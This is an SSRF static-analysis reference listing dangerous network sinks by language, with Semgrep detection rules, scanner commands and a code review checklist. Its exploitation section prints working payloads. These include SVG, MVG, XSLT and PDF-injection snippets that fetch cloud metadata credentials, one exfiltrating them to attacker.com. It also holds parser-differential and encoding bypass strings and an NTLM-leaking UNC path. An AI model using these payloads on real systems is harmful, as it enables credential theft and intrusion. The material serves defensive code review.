# SSRF Static Analysis Reference

## Dangerous Sinks by Language

### PHP

PHP has the most SSRF sinks due to its many built-in URL-aware functions.

#### Direct HTTP/Network Sinks

| Function | Risk | Notes |
|----------|------|-------|
| `file_get_contents($url)` | Critical | Supports `http://`, `ftp://`, `file://`, `php://`, `data://` via stream wrappers |
| `fopen($url, 'r')` | Critical | Same stream wrapper support as `file_get_contents` |
| `readfile($url)` | Critical | Reads and outputs file; supports stream wrappers |
| `copy($url, $dest)` | Critical | Can copy from remote URL to local file |
| `curl_init($url)` + `curl_exec()` | Critical | Full HTTP client; check `CURLOPT_URL` set from user input |
| `fsockopen($host, $port)` | Critical | Raw TCP socket; direct internal network access |
| `pfsockopen($host, $port)` | Critical | Persistent variant of `fsockopen` |
| `stream_socket_client($url)` | Critical | Supports `tcp://`, `udp://`, `ssl://`, `unix://` |
| `get_headers($url)` | High | Makes HTTP HEAD request; leaks internal response headers |
| `SoapClient($wsdl)` | High | Fetches WSDL from URL; also exploitable via `__call()` + `location` in deserialization |
| `Guzzle\Client->get($url)` | High | Popular HTTP client; check all HTTP method calls |
| `Symfony\HttpClient` | High | Check `->request()` method with user-controlled URL |
| `ftp_connect($host)` | Medium | FTP connection to arbitrary host |
| `file($url)` | Critical | Reads file into array; supports all stream wrappers like `file_get_contents` |
| `highlight_file($url)` | High | Reads and syntax-highlights file; alias `show_source()` |
| `SplFileObject($url)` | Critical | OOP file access; supports stream wrappers |
| `Imagick($url)` | Critical | ImageMagick; SVG/MVG with embedded `<image href="http://...">` fetches URLs |
| `imap_open($mailbox)` | Critical | CVE-2018-19518; `-oProxyCommand` in mailbox string = RCE |
| `ldap_connect($host)` | High | LDAP connection to arbitrary host |
| `mail($to,$subj,$msg,$headers)` | Medium | SMTP header injection → connect to arbitrary SMTP |
| `yaml_parse_url($url)` | Critical | YAML parser that fetches from URL directly |
| `yaml_parse($yaml)` | High | If YAML contains `!!php/object` → deserialization → SoapClient SSRF |
| `stream_context_create($opts)` | High | User-controlled `http.proxy`, `ssl.peer_name` in context options |
| `pg_connect($dsn)` | High | PostgreSQL connection with user-controlled host/port |
| `mysqli_connect($host)` | High | MySQL connection to arbitrary host |
| `new PDO($dsn)` | High | Database connection with user-controlled DSN |
| `ssh2_connect($host)` | High | SSH connection to arbitrary host (if ssh2 extension loaded) |

#### PHP Stream Wrappers (CTF Favorites)

These wrappers work in **any** function that accepts URLs when `allow_url_fopen=On`:

| Wrapper | Use | Notes |
|---------|-----|-------|
| `php://filter/convert.base64-encode/resource=file` | Arbitrary file read | Base64 encodes output; bypasses WAFs. Chain filters for complex reads |
| `php://filter` chains | Arbitrary file write | Chain `convert.iconv` filters to generate arbitrary content (research: synacktiv filter chains) |
| `phar://archive.phar/file` | Deserialization + SSRF | Triggers `__destruct`/`__wakeup` on metadata; needs phar upload |
| `data://text/plain;base64,PD9waHA...` | Code execution | Inline data as URL; bypasses file extension checks |
| `expect://command` | RCE | Executes shell command (requires `expect` extension) |
| `zip://archive.zip#file` | Archive traversal | Read files inside uploaded ZIP archives |
| `glob://pattern` | Directory listing | Enumerate files matching pattern |
| `compress.zlib://file` | File read | Reads through compression; bypasses some filters |

#### Image/Media Processing Sinks

| Function | Risk | Notes |
|----------|------|-------|
| `getimagesize($url)` | High | Makes HTTP request to fetch image headers; often overlooked |
| `imagecreatefromjpeg($url)` | High | GD library; fetches image from URL |
| `imagecreatefrompng($url)` | High | Same as above for PNG |
| `imagecreatefromgif($url)` | High | Same as above for GIF |
| `imagecreatefromwebp($url)` | High | Same as above for WebP |
| `exif_read_data($url)` | Medium | Reads EXIF from remote image |
| `Imagick::readImage($url)` | Critical | Reads image from URL; SVG with `<image>` tag fetches internal URLs |
| `new Imagick($url)` | Critical | Constructor variant; same SVG/MVG delegate abuse |

#### XML Processing Sinks (XXE -> SSRF)

| Function | Risk | Notes |
|----------|------|-------|
| `simplexml_load_file($url)` | Critical | Fetches and parses remote XML; also XXE vector |
| `DOMDocument->load($url)` | Critical | Loads remote XML document |
| `XMLReader::open($url)` | Critical | Stream-based XML reader from URL |
| `simplexml_load_string($xml)` | High | If XML contains external entities with URLs |
| `libxml_disable_entity_loader(false)` | High | Enables external entity loading (default in PHP < 8.0) |

#### File Inclusion (RFI -> SSRF)

| Function | Risk | Notes |
|----------|------|-------|
| `include($url)` | Critical | Remote file inclusion if `allow_url_include=On` |
| `require($url)` | Critical | Same as include |
| `include_once($url)` | Critical | Same as include |
| `require_once($url)` | Critical | Same as include |

**PHP-specific config to check:**
```ini
; php.ini settings that enable/disable URL-aware functions
allow_url_fopen = On    ; Enables URL support in fopen/file_get_contents (default: On)
allow_url_include = Off ; Enables URL support in include/require (default: Off since 5.2)
```

#### PHP Semgrep Patterns

```yaml
rules:
  - id: php-ssrf-file-get-contents
    patterns:
      - pattern: file_get_contents($URL)
      - pattern-not: file_get_contents("...")
    message: "Potential SSRF: file_get_contents with dynamic URL"
    severity: ERROR
    languages: [php]

  - id: php-ssrf-curl
    patterns:
      - pattern: curl_setopt($CH, CURLOPT_URL, $URL)
      - pattern-not: curl_setopt($CH, CURLOPT_URL, "...")
    message: "Potential SSRF: cURL with dynamic URL"
    severity: ERROR
    languages: [php]

  - id: php-ssrf-getimagesize
    patterns:
      - pattern: getimagesize($URL)
      - pattern-not: getimagesize("...")
    message: "Potential SSRF: getimagesize with dynamic URL"
    severity: WARNING
    languages: [php]

  - id: php-ssrf-soap
    patterns:
      - pattern: new SoapClient($URL, ...)
      - pattern-not: new SoapClient("...", ...)
      - pattern-not: new SoapClient(null, ...)
    message: "Potential SSRF: SoapClient with dynamic WSDL URL"
    severity: ERROR
    languages: [php]
```

---

### Go

| Function | Risk | Notes |
|----------|------|-------|
| `http.Get(url)` | Critical | Direct HTTP GET with user-controlled URL |
| `http.Post(url, ...)` | Critical | Direct HTTP POST |
| `http.Head(url)` | Critical | Direct HTTP HEAD |
| `http.NewRequest(method, url, ...)` | Critical | Check if `url` comes from user input |
| `client.Do(req)` | High | Trace `req.URL` back to source |
| `http.DefaultClient.Get(url)` | Critical | Uses default client (no timeouts, follows redirects) |
| `net.Dial(network, addr)` | Critical | Raw TCP/UDP connection to arbitrary host:port |
| `net.DialTimeout(network, addr, ...)` | Critical | Same as Dial with timeout |
| `rpc.Dial(network, addr)` | High | RPC connection to internal services |
| `rpc.DialHTTP(network, addr)` | High | HTTP-based RPC connection |
| `os.Open(path)` | Medium | If path from user input, potential file:// equivalent |
| `os.ReadFile(path)` | Medium | Same as above |
| `grpc.Dial(target)` | High | gRPC connection to user-controlled target |
| `exec.Command("curl", url)` | Critical | Subprocess SSRF; also check `wget`, `python -c` |
| `sql.Open(driver, dsn)` | High | Database connection with user-controlled DSN (host:port in DSN string) |
| `websocket.Dial(url, ...)` | High | gorilla/websocket; WebSocket to arbitrary host |
| `fasthttp.Do(req)` | Critical | High-performance HTTP client; check `req.SetRequestURI()` |
| `colly.NewCollector().Visit(url)` | Critical | Web scraper framework; crawls user-controlled URL |
| `net.LookupHost(host)` | Medium | DNS lookup; information disclosure of internal DNS |
| `net.ResolveIPAddr(net, addr)` | Medium | IP resolution; can probe internal network |

**Go-specific patterns to grep:**
```bash
# Find all http.Get/Post/Head with non-literal URLs
grep -rn 'http\.\(Get\|Post\|Head\)(' --include='*.go' | grep -v '"http'

# Find net.Dial with variables
grep -rn 'net\.Dial\(Timeout\)\?(' --include='*.go'

# Find NewRequest with variable URL
grep -rn 'http\.NewRequest(' --include='*.go'
```

#### Go Semgrep Patterns

```yaml
rules:
  - id: go-ssrf-http-get
    patterns:
      - pattern: http.Get($URL)
      - pattern-not: http.Get("...")
    message: "Potential SSRF: http.Get with dynamic URL"
    severity: ERROR
    languages: [go]

  - id: go-ssrf-net-dial
    patterns:
      - pattern: net.Dial($NETWORK, $ADDR)
      - pattern-not: net.Dial($NETWORK, "...")
    message: "Potential SSRF: net.Dial with dynamic address"
    severity: ERROR
    languages: [go]
```

---

### TypeScript / Node.js

#### Built-in and Popular HTTP Libraries

| Function / Library | Risk | Notes |
|-------------------|------|-------|
| `fetch(url)` | Critical | Native fetch (Node 18+); follows redirects by default |
| `http.request(url)` | Critical | Node built-in; raw HTTP request |
| `http.get(url)` | Critical | Convenience wrapper around `http.request` |
| `https.request(url)` | Critical | TLS variant |
| `https.get(url)` | Critical | TLS variant |
| `axios.get(url)` | Critical | Popular HTTP client; check all method calls |
| `axios(config)` | Critical | Check `config.url` and `config.baseURL` |
| `got(url)` | Critical | Popular HTTP client |
| `node-fetch(url)` | Critical | Polyfill for fetch API |
| `superagent.get(url)` | Critical | Check all HTTP method calls |
| `undici.request(url)` | Critical | High-performance HTTP client (powers Node's fetch) |
| `request(url)` | Critical | Deprecated but still widely used |
| `needle.get(url)` | High | Lightweight HTTP client |
| `new WebSocket(url)` | High | Built-in WebSocket; connects to arbitrary host |
| `ws.connect(url)` | High | `ws` library; popular WebSocket client |

#### Headless Browser Sinks (CTF Favorite)

| Function | Risk | Notes |
|----------|------|-------|
| `puppeteer.page.goto(url)` | Critical | Headless Chrome; full browser SSRF with JS execution, can read `file://` |
| `puppeteer.page.setContent(html)` | Critical | HTML with `<img src="http://internal">`, `<iframe>`, `<link>` fetches URLs |
| `playwright.page.goto(url)` | Critical | Same as Puppeteer; Chromium/Firefox/WebKit |
| `playwright.page.setContent(html)` | Critical | Same HTML resource fetching |

These are especially dangerous because the browser engine follows redirects, loads sub-resources, and executes JavaScript — effectively a full SSRF proxy.

#### Image/Media/Document Processing Sinks

| Function | Risk | Notes |
|----------|------|-------|
| `sharp(url)` | High | Image processing; may fetch from URL |
| `pdf-lib` / `pdfkit` | Medium | Check if external resources (images, fonts) loaded from user URLs |
| `html-pdf` / `wkhtmltopdf` | Critical | HTML-to-PDF = headless browser SSRF; `<img src="http://internal">` |

#### Network / Database Sinks

| Function | Risk | Notes |
|----------|------|-------|
| `net.createConnection(port, host)` | Critical | Raw TCP to arbitrary host:port |
| `net.connect(options)` | Critical | Same as `createConnection` |
| `tls.connect(port, host)` | Critical | Raw TLS connection |
| `dgram.createSocket().send(msg, port, host)` | High | UDP to arbitrary host |
| `new MongoClient(url)` | High | MongoDB connection with user-controlled connection string |
| `new Redis(options)` | High | `ioredis`; user-controlled host/port |
| `createClient({ url })` | High | `redis` package; user-controlled connection URL |
| `nodemailer.createTransport({ host })` | Medium | SMTP connection to user-controlled host |
| `ssh2.Client().connect({ host })` | High | SSH connection to arbitrary host |

#### File System / Process Sinks

| Function | Risk | Notes |
|----------|------|-------|
| `fs.readFile(path)` | Medium | If path from user input, reads arbitrary files |
| `fs.createReadStream(path)` | Medium | Same as above, streamed |
| `child_process.exec('curl ' + url)` | Critical | Command injection + SSRF combined |
| `child_process.execSync('wget ' + url)` | Critical | Same as above |

#### URL Construction Patterns

```typescript
// DANGEROUS: User controls full URL
const response = await fetch(req.body.url);

// DANGEROUS: User controls path but attacker uses protocol-relative URL
const response = await fetch(`${baseUrl}${req.params.path}`);
// Attacker sends path=//evil.com/... or path=@evil.com

// DANGEROUS: URL constructed from user parts
const url = new URL(req.query.endpoint, 'http://internal-api');
// Attacker sends endpoint=http://evil.com (absolute URL ignores base)

// SAFER: Allowlisted hosts only
const ALLOWED_HOSTS = new Set(['api.example.com', 'cdn.example.com']);
const parsed = new URL(userUrl);
if (!ALLOWED_HOSTS.has(parsed.hostname)) throw new Error('Blocked');
```

#### Node.js Semgrep Patterns

```yaml
rules:
  - id: node-ssrf-fetch
    patterns:
      - pattern: fetch($URL, ...)
      - pattern-not: fetch("...", ...)
    message: "Potential SSRF: fetch with dynamic URL"
    severity: ERROR
    languages: [typescript, javascript]

  - id: node-ssrf-axios
    patterns:
      - pattern: axios.get($URL, ...)
      - pattern-not: axios.get("...", ...)
    message: "Potential SSRF: axios with dynamic URL"
    severity: ERROR
    languages: [typescript, javascript]

  - id: node-ssrf-http-request
    patterns:
      - pattern: http.request($URL, ...)
      - pattern-not: http.request("...", ...)
    message: "Potential SSRF: http.request with dynamic URL"
    severity: ERROR
    languages: [typescript, javascript]

  - id: node-ssrf-url-constructor
    pattern: new URL($INPUT, ...)
    message: "Check URL constructor: absolute user input ignores base parameter"
    severity: WARNING
    languages: [typescript, javascript]
```

---

### Python

| Function / Library | Risk | Notes |
|-------------------|------|-------|
| `requests.get(url)` | Critical | Most popular HTTP client; check all method calls |
| `requests.post(url)` | Critical | Same |
| `requests.request(method, url)` | Critical | Generic method |
| `urllib.request.urlopen(url)` | Critical | Built-in; supports `file://`, `ftp://` |
| `urllib.request.urlretrieve(url)` | Critical | Downloads file from URL |
| `urllib.request.Request(url)` | Critical | Check where Request object is used |
| `httpx.get(url)` | Critical | Async-capable HTTP client |
| `httpx.AsyncClient().get(url)` | Critical | Async variant |
| `aiohttp.ClientSession().get(url)` | Critical | Async HTTP client |
| `http.client.HTTPConnection(host)` | High | Low-level HTTP; check host from user input |
| `socket.create_connection((host, port))` | Critical | Raw TCP connection |
| `pycurl.Curl().setopt(URL, url)` | Critical | Python cURL bindings |
| `subprocess.run(['curl', url])` | Critical | Command execution + SSRF |
| `lxml.etree.parse(url)` | High | XML parser; XXE -> SSRF |
| `PIL.Image.open(url)` | Medium | Pillow; fetches remote images in some configurations |
| `wand.image.Image(filename=url)` | Critical | ImageMagick Python binding; same SVG/MVG delegate abuse as PHP Imagick |

#### Network Protocol Sinks

| Function / Library | Risk | Notes |
|-------------------|------|-------|
| `ftplib.FTP(host)` | High | FTP connection to arbitrary host |
| `smtplib.SMTP(host)` | High | SMTP connection; can probe internal mail servers |
| `imaplib.IMAP4(host)` | High | IMAP connection to arbitrary host |
| `poplib.POP3(host)` | High | POP3 connection to arbitrary host |
| `xmlrpc.client.ServerProxy(url)` | Critical | XML-RPC client; makes HTTP requests to URL |
| `paramiko.SSHClient().connect(host)` | High | SSH connection to arbitrary host |
| `ldap3.Connection(server)` | High | LDAP connection to user-controlled server |
| `telnetlib.Telnet(host)` | High | Telnet connection (deprecated but still in codebases) |

#### Headless Browser / Scraping Sinks

| Function / Library | Risk | Notes |
|-------------------|------|-------|
| `selenium.webdriver.get(url)` | Critical | Full browser SSRF; JS execution, follows redirects, loads sub-resources |
| `playwright.page.goto(url)` | Critical | Same as Selenium; Chromium/Firefox/WebKit |
| `scrapy.Request(url)` | Critical | Web scraping framework; follows redirects, respects robots.txt |
| `feedparser.parse(url)` | High | RSS/Atom feed parser; fetches from URL |

#### Data Loading Sinks (Often Overlooked)

| Function | Risk | Notes |
|----------|------|-------|
| `pandas.read_csv(url)` | High | Fetches CSV from URL; `file://` may work |
| `pandas.read_json(url)` | High | Same for JSON |
| `pandas.read_html(url)` | High | Fetches and parses HTML from URL |
| `pandas.read_excel(url)` | High | Same for Excel files |
| `pandas.read_parquet(url)` | High | Same for Parquet; `s3://` and `gs://` supported |

#### PDF / Document Generation Sinks

| Function / Library | Risk | Notes |
|-------------------|------|-------|
| `weasyprint.HTML(url=url)` | Critical | HTML-to-PDF; full CSS/image fetching from internal URLs |
| `xhtml2pdf.pisa.CreatePDF(html)` | High | HTML with `<img src="http://internal">` fetches resources |
| `pdfkit.from_url(url)` | Critical | Wraps wkhtmltopdf; headless browser SSRF |

#### Database / Service Connection Sinks

| Function / Library | Risk | Notes |
|-------------------|------|-------|
| `redis.Redis(host=user_input)` | High | Redis connection to arbitrary host |
| `pymongo.MongoClient(url)` | High | MongoDB with user-controlled connection string |
| `boto3.client(endpoint_url=url)` | High | AWS SDK with custom endpoint; sends credentials to attacker host |
| `celery.Celery(broker=url)` | High | Task queue broker connection to arbitrary host |

#### Python Semgrep Patterns

```yaml
rules:
  - id: python-ssrf-requests
    patterns:
      - pattern: requests.$METHOD($URL, ...)
      - pattern-not: requests.$METHOD("...", ...)
      - metavariable-regex:
          metavariable: $METHOD
          regex: (get|post|put|delete|patch|head|options|request)
    message: "Potential SSRF: requests with dynamic URL"
    severity: ERROR
    languages: [python]

  - id: python-ssrf-urlopen
    patterns:
      - pattern: urllib.request.urlopen($URL)
      - pattern-not: urllib.request.urlopen("...")
    message: "Potential SSRF: urlopen with dynamic URL"
    severity: ERROR
    languages: [python]
```

---

## Static Analysis Tools

| Tool | Languages | SSRF Support |
|------|-----------|-------------|
| **Semgrep** | All | Custom rules above + `p/owasp` ruleset includes SSRF |
| **CodeQL** | JS/TS, Python, Go, Java, C# | Built-in SSRF queries in `security-extended` suite |
| **Bandit** | Python only | `B310` (urllib), `B309` (httpsconnection) |
| **PHPStan + security rules** | PHP only | Taint analysis with security extensions |
| **Psalm** | PHP only | Taint analysis via `--taint-analysis` flag |
| **gosec** | Go only | `G107` (SSRF via variable URL in http.Get) |
| **ESLint + security plugins** | JS/TS | `eslint-plugin-security` has limited SSRF coverage |
| **Snyk Code** | All | Commercial; good taint tracking for SSRF |
| **SonarQube** | All | `S5144` SSRF rule across languages |

### Running Static Analysis

```bash
# Semgrep with OWASP rules (covers SSRF)
semgrep --config p/owasp --config p/security-audit .

# Semgrep with custom SSRF rules file
semgrep --config ssrf-rules.yaml .

# CodeQL (GitHub)
codeql database create mydb --language=javascript
codeql database analyze mydb codeql/javascript-queries:Security/CWE-918

# Bandit (Python)
bandit -r . -t B310,B309

# gosec (Go)
gosec -include=G107 ./...

# Psalm taint analysis (PHP)
psalm --taint-analysis
```

---

## Cross-Language Edge Cases (CTF Exploitation Patterns)

### URL Parser Differentials

Different libraries parse the same URL differently. Exploit the gap between the **validator** and the **fetcher**:

```
http://evil.com\@good.com
  Python urllib:  host = good.com (backslash treated as path)
  cURL/Chrome:   host = evil.com (backslash = username separator)

http://good.com%00@evil.com
  Some parsers:  host = good.com (null byte terminates)
  Others:        host = evil.com (null byte ignored)

http://127.0.0.1:80\@good.com/
  Go net/url:    host = good.com
  Node url:      host = 127.0.0.1

http://good.com#@evil.com
  Parser A:      host = good.com, fragment = @evil.com
  Parser B:      host = evil.com (fragment mishandled)
```

**CTF approach**: Identify which library validates vs which library fetches. If different, test parser differential payloads.

### Deserialization -> SSRF Chains

Deserialize a crafted object that makes HTTP requests on `__destruct`/`__wakeup`/`__reduce__`:

| Language | Gadget | How |
|----------|--------|-----|
| **PHP** | `SoapClient.__call()` | Deserialize SoapClient with `location=http://internal`; any method call triggers HTTP request |
| **PHP** | `Imagick` | Deserialize with SVG/MVG containing internal URLs |
| **Python** | `pickle.__reduce__()` | `subprocess.Popen(['curl', 'http://internal'])` in reduce |
| **Python** | `yaml.load()` (unsafe) | `!!python/object/apply:urllib.request.urlopen ['http://internal']` |
| **Java** | `java.net.URL.hashCode()` | `URL` object in HashMap triggers DNS lookup on deserialization |
| **Java** | JNDI injection | `rmi://` or `ldap://` lookup to attacker server |

### SVG / ImageMagick Delegate Abuse

Upload an SVG that triggers server-side URL fetching:

```xml
<!-- SVG with external image reference -->
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/" width="100" height="100"/>
</svg>

<!-- SVG with foreignObject for more complex fetching -->
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject>
    <body xmlns="http://www.w3.org/1999/xhtml">
      <iframe src="http://127.0.0.1:6379/"/>
    </body>
  </foreignObject>
</svg>
```

ImageMagick MVG (Magick Vector Graphics):
```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
pop graphic-context
```

**Affects**: PHP `Imagick`, Python `wand`, Node `sharp` (when using ImageMagick backend), any `convert` subprocess call.

### XSLT Processor SSRF

XSLT stylesheets can import/include remote documents:

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:import href="http://169.254.169.254/latest/meta-data/"/>
  <xsl:template match="/">
    <xsl:copy-of select="document('http://127.0.0.1:8080/admin')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Affected functions**: PHP `XSLTProcessor->importStylesheet()`, Python `lxml.etree.XSLT()`, Java `TransformerFactory`, Node `xslt-processor`.

### PDF Generation SSRF

Any HTML-to-PDF tool is a headless browser. User-controlled HTML = SSRF:

```html
<!-- Injected into PDF template -->
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<link rel="stylesheet" href="http://127.0.0.1:8080/admin">
<iframe src="http://internal-api:3000/secrets"></iframe>
<script>
  // If JS enabled, exfiltrate via fetch
  fetch('http://169.254.169.254/latest/meta-data/')
    .then(r => r.text())
    .then(d => fetch('http://attacker.com/?data=' + btoa(d)));
</script>
```

**Affected tools**: wkhtmltopdf, WeasyPrint, Puppeteer/Playwright PDF, Chrome headless `--print-to-pdf`, xhtml2pdf, Prince XML.

### DNS Rebinding via TOCTOU

Time-of-check vs time-of-use: validator resolves DNS, then fetcher resolves again:

```
1. App receives url=http://rebind.attacker.com/
2. Validator resolves rebind.attacker.com -> 1.2.3.4 (external, allowed)
3. Milliseconds later, fetcher resolves rebind.attacker.com -> 127.0.0.1 (internal!)
4. Fetcher connects to 127.0.0.1
```

**Fix**: Resolve DNS once, pin the IP, use the resolved IP for the actual connection.

### Unicode / Encoding Tricks

```
# Fullwidth characters (Unicode normalization)
http://⑯⑨。②⑤④。⑯⑨。②⑤④/   →  http://169.254.169.254/

# Enclosed alphanumerics
http://①②⑦.⓪.⓪.①/           →  http://127.0.0.1/

# Right-to-left override (U+202E)
http://‮1.0.0.721/              →  visually looks like external URL

# Homoglyph domains
http://lоcalhost/               →  Cyrillic 'о' instead of Latin 'o'

# CRLF injection in Host header
http://internal%0d%0aHost:%20evil.com/
```

### IPv6 Edge Cases

```
http://[::1]/                    # Standard IPv6 loopback
http://[0:0:0:0:0:0:0:1]/       # Expanded IPv6 loopback
http://[::ffff:127.0.0.1]/      # IPv4-mapped IPv6
http://[::ffff:7f00:1]/         # Same in hex
http://[0:0:0:0:0:ffff:127.0.0.1]/  # Full form
http://[::1%25eth0]/             # Scoped address (may bypass filters)
```

### Windows-Specific (If Target Runs Windows)

```
\\evil.com\share\file            # UNC path → SMB connection (leaks NTLM hash)
file:///C:/Windows/System32/drivers/etc/hosts
\\127.0.0.1\C$\Windows\System32\drivers\etc\hosts
```

### Header Injection → Internal Routing

Some HTTP libraries allow newlines in URLs, injecting extra headers:

```
http://internal\r\nX-Forwarded-For: 127.0.0.1\r\nHost: admin.internal\r\n\r\n
```

This can manipulate virtual host routing, bypass IP-based access controls, or inject authentication headers.

---

## Code Review Checklist

When reviewing code for SSRF, check:

- [ ] **All URL inputs identified**: Search for sink functions listed above
- [ ] **Source-to-sink traced**: Does user input flow into any URL-fetching function?
- [ ] **Scheme validation**: Only `http://` and `https://` allowed?
- [ ] **Host validation**: Resolved IP checked against private ranges?
- [ ] **DNS pinning**: DNS resolved before request, IP reused for connection?
- [ ] **Redirect handling**: Redirects validated (no redirect to internal)?
- [ ] **Protocol-specific**: `file://`, `gopher://`, `dict://` explicitly blocked?
- [ ] **Library defaults**: Does the HTTP client follow redirects by default?
- [ ] **XML parsing**: External entities disabled? (`libxml_disable_entity_loader`, `resolve_entities=False`)
- [ ] **Timeout set**: Request timeout configured to prevent hanging on internal scanning?
- [ ] **Response size limited**: Max response body size to prevent data exfiltration?
- [ ] **Error messages**: Internal errors not leaked to user (host unreachable, connection refused)?
- [ ] **Parser differential**: Same library used for validation and fetching? (different parsers = bypass)
- [ ] **Deserialization**: Any user-controlled deserialization that could construct URL-fetching objects?
- [ ] **Image/SVG upload**: Uploaded images processed server-side? SVG/MVG with `<image href>` checked?
- [ ] **PDF/HTML-to-PDF**: User content rendered to PDF? Sub-resource loading restricted?
- [ ] **Data loading**: `pandas.read_*()`, `feedparser.parse()`, or similar accepting user URLs?
- [ ] **Database DSN**: Connection strings constructed from user input?
- [ ] **Unicode normalization**: Fullwidth/homoglyph characters normalized before or after validation?
- [ ] **IPv6 handling**: IPv4-mapped IPv6 (`::ffff:127.0.0.1`) and scoped addresses checked?
